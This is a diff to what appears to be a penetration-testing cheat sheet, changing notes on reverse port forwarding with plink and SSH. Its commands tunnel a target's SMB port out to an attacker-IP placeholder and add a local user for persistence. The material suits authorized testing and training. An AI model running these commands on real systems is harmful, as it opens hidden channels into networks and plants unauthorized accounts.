@@ -111,16 +111,16 @@ ____
  # Port Forwarding
  Expose internal services, usually hidden due to firewall rules. 
  ## Plink
-     [upload plink.exe]
-     plink.exe -l kali -pw password -R 445:127.0.0.1:445 YOURIPADDRESS                  <-note entering in your password on a remote box is a bad idea
+     [upload plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)  
+     plink.exe -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS   <-note entering in your password on a victim box is a bad idea
      
-     -> better to generate ssh keys on kali, convert to putty keys and then upload  
+     [generate ssh keys on kali, convert to putty keys and then upload with plink.exe to target ] 
      sudo apt install putty-tools 
      puttygen KEYFILE -o OUTPUT_KEY.ppk 
      cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
  ## SSH (Window 10 and newer)
      [from target box to expose SMB ]
-     ssh -l kali -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
+     ssh -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
  ____
  # Persistence
      net user USERNAME PASSWORD /add
